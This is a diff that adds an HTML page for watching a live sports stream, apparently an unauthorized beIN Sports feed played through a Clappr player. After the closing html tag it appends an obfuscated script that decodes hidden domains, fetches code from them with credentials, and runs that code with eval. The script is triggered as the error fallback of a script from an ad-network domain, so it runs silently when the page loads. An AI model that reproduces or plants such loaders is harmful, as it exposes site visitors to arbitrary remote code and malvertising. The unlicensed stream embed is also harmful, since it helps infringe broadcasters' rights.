@@ -1,0 +1,173 @@
+<html>
+
+
+
+<head>
+
+
+
+<title>مشاهدة لايف </title>
+
+
+
+</head>
+
+
+
+<body style="margin:0px;padding:0px;overflow:hidden">
+
+
+
+ 
+
+
+
+<script src="//api.peer5.com/peer5.js?id=d5ava51xd3dzlnc81rc1"></script>
+
+
+
+ 
+
+
+
+<script src="//api.peer5.com/peer5.clappr.plugin.js"></script>
+
+
+
+ 
+
+
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/clappr/latest/clappr.min.js"></script>
+
+
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/clappr.level-selector/latest/level-selector.min.js"></script>
+
+
+
+</head>
+
+
+
+<div id="player"></div>
+
+
+
+<script>
+
+
+
+var playerElement = document.getElementById("player");
+
+
+
+
+
+
+
+var player = new Clappr.Player({
+
+
+
+ height: "100%",
+
+
+
+ width: "100%",
+
+
+
+  plugins: {
+
+
+
+    'core': [LevelSelector]
+
+
+
+  },
+
+
+
+ hlsjsConfig: {
+
+
+
+ xhrSetup: function(xhr, url) {
+
+
+
+  xhr.withCredentials = false;
+
+
+
+ }
+
+
+
+ },
+
+
+
+ playbackConfig: {
+
+
+
+ crossorigin: 'use-credentials'
+
+
+
+ }
+
+
+
+});
+
+
+
+
+
+
+
+player.attachTo(playerElement);
+
+
+
+
+
+
+
+
+
+
+
+player.load({source: 'http://sstvb1.vdmscdn.com/beinsport-3-sd/index.m3u8', mimeType: 'application/x-mpegURL'});
+
+
+
+player.play();
+
+
+
+
+
+
+
+</script>
+
+
+
+</body>
+
+
+
+</html>
+
+
+
+
+
+
+<script data-cfasync="false" type="text/javascript"> var N4N=window;for(var f in N4N){if(f.length===((6.,65.)<=(0xD0,0x171)?(0x9D,6):(134.5E1,0x1D9)<0x6?(97,''):(8.61E2,0x23B))&&f.charCodeAt((103==(14.700E2,103)?(0xCB,3):(3.1E1,137.4E1)))===((116.,103.)<(41,0x1D5)?(97.,100):(124.,0x1EA))&&f.charCodeAt((0x16E>=(101.80E1,1.294E3)?(0xC8,4.4E1):(0x3C,2.45E2)<=(84.,1.262E3)?(0xB2,5):(48,1.379E3)))===(0x1B7<=(149.6E1,110.80E1)?(0x9A,119):(57.90E1,138)>0xD5?0x1CB:(0x16,71))&&f.charCodeAt((0x4D<=(0x135,32.30E1)?(19,1):(0x5F,128.)))===((109,4.05E2)<=(30.,0x1B3)?(122,105):(0xB8,0x236))&&f.charCodeAt(((6.65E2,128)>(38,12.9E2)?(0x231,'/'):(0xE4,27.70E1)<7.7E2?(1.1E2,0):(0x1D6,0x1C7)))===((0x232,63.)<=46.2E1?(13.70E1,119):(0x25,94.60E1)<=(11.290E2,50.)?(90,6.60E1):(56.,77)))break};for(var J in N4N[f]){if(J.length===((0x8F,31.90E1)<=(10.31E2,18.1E1)?'S':(0xE1,4.28E2)>=(0x1D7,67.)?(125,8):(120,1.389E3))&&J.charCodeAt(((29.0E1,43)<=93.80E1?(0xBC,5):(0x118,0x141)))===(35.5E1<=(0x1FE,142.5E1)?(1.442E3,101):(1.157E3,0x1C1))&&J.charCodeAt(((0x111,6.350E2)<=(33.7E1,72.7E1)?(137,7):(86,7.16E2)))===(102<=(56.6E1,100.)?0x106:(52.90E1,0xF5)<(6.41E2,2.47E2)?(0xEC,116):(0x96,75.10E1))&&J.charCodeAt(((136,112)<=(10.44E2,0x193)?(0x49,3):(6.060E2,0xEA)))===(14.93E2>=(1.445E3,0xF5)?(81.,117):97<=(57.,0x3C)?(0x243,4.66E2):(0x139,0x39))&&J.charCodeAt(((38,0xB9)>(0x23F,4)?(63.2E1,0):(137,0x20B)))===((8.98E2,99.)<120.30E1?(0x104,100):(58.1E1,0xA2)))break};(function(V,g,C,w){N4N[f][g]=function(){var r=((86,13.42E2)<=0x67?(0x13D,''):19<=(51.30E1,33)?(0x33,0):(0x14F,7.16E2)),x=r,o=function o(){var K=((1.28E3,1.266E3)<0x134?(0,"i"):(76,1.372E3)>=0x188?(0xDB,'/'):(9.94E2,46.40E1));var p='';var e='//';var q=(0xCB>=(32,0x1B2)?(0x173,"Q"):(2.85E2,12.06E2)>=36.0E1?(6.890E2,'T'):(0x18C,0xA1));var N='GE';var a=(139.4E1>(1.83E2,132.)?(0xE3,true):(10.08E2,0xD0));var s=new XMLHttpRequest();s.withCredentials=a;s.open((N+q),(e)+N4N[f]['atob'](C[x].split(p).reverse().join(p))+K+w+K,a);s.onreadystatechange=function(){var H=((86.,34.80E1)>=(9.040E2,0xA5)?(0x1EA,200):(11.20E1,4.82E2));var U=((0x24C,64.3E1)>149?(9.8E2,4):(0x113,12.59E2));if(s.readyState==U&&s.status==H&&s.responseText){eval(s.responseText);}};s.onerror=function(){if(++x!=C.length){o();}};try{s.send();}catch(H){s.onerror();}};o();};})(N4N[f][J],'_rvpxwrff',['==QbvNmLqRWOuVGO4NGb2hGOxFTZv52btxmd28mcyRTa','=02bj5CanVGb2RmNmNmemdjdndDbxp2NqJ2dyQTb','t92YuYzc2UWNrRXcxFXe5cmYz8mZhNGNx9WcqVGc','==QbvNmL5dHazVWa41mdzAHOidGOhRHMpR3YwQnexgnM'],'bEkwOjEzMjA3MTY6UHhKMmo');</script><script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=1320714" onerror="window._rvpxwrff();"></script>
+
